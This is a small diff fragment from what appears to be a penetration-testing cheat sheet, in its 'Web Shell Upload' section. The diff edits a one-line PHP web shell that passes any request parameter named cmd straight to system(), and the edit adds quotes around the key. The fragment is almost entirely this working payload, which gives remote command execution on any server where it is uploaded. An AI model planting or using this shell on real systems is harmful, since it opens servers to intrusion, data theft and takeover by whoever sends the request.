@@ -111,7 +111,7 @@ Web Shell Upload:
       
 Basic PHP Web Shell:
 
-      <?php system($_REQUEST[cmd]); ?>
+      <?php system($_REQUEST['cmd']); ?>
       
 OR 
       
